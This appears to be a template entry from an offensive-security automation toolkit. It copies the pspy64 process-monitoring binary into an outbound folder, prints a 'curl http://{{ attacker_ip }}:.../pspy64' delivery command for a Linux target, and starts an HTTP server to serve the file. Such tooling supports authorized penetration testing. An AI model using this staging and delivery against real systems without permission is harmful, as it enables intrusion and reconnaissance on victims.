content: "mkdir -p packstation/outbound; cp -n {{ tools_dir }}/pspy/pspy64 packstation/outbound/;\
  \ \\\necho '================================================================'; \\\
  \necho '                       -----Linux------                         '; \\\n\
  echo 'Deliver: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/pspy64\
  \ -o {{ delivery_path_linux }}/pspy64'; \\\necho '================================================================';\
  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
  \ delivery_outbound_port }} -d packstation/outbound\n"
